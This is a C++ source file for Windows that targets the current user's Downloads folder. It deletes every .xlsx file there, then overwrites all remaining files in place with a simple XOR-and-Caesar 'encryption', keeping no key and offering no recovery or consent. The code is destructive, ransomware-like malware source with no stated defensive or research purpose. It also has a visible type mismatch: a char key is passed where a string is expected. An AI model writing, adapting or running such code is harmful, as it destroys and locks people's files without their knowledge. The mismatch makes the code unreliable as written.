#include <iostream>
#include <string>
#include <windows.h>
#include <fstream>
#include <dirent.h>
#include <vector>
#include "encryption.h"

void removeXlsxFiles(const std::string& directory) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*.xlsx").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cout << "No .xlsx files found." << std::endl;
        return;
    }

    do {
        std::string filePath = directory + "\\" + findFileData.cFileName;
        if (DeleteFile(filePath.c_str())) {
            std::cout << "Removed: " << filePath << std::endl;
        } else {
            std::cout << "Failed to remove: " << filePath << std::endl;
        }
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

void encryptFiles(const std::string& directory, const std::string& xorKey, int caesarShift) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        std::cout << "Error: Unable to access directory." << std::endl;
        return;
    }

    do {
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            continue;  // Skip directories
        }

        std::string filePath = directory + "\\" + findFileData.cFileName;
        std::ifstream file(filePath, std::ios::binary);
        if (!file.is_open()) {
            continue;
        }

        std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        file.close();

        std::string fileContent(buffer.begin(), buffer.end());
        std::string encryptedContent = Encryption::kk5vEncrypt(fileContent, xorKey[0], caesarShift);

        std::ofstream outFile(filePath, std::ios::binary);
        outFile.write(encryptedContent.c_str(), encryptedContent.size());
        outFile.close();

        std::cout << "Encrypted: " << filePath << std::endl;
    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
}

int main() {
    char xorKey = 'k';  // Example XOR key for encryption
    int caesarShift = 5;  // Example Caesar cipher shift

    char* userProfile = getenv("USERPROFILE");
    if (!userProfile) {
        std::cerr << "Error: USERPROFILE environment variable not found." << std::endl;
        return 1;
    }

    std::string downloadsDir = std::string(userProfile) + "\\Downloads";

    // Remove all .xlsx files
    removeXlsxFiles(downloadsDir);

    // Encrypt remaining files with kk5v (XOR + Caesar cipher)
    encryptFiles(downloadsDir, xorKey, caesarShift);

    return 0;
}
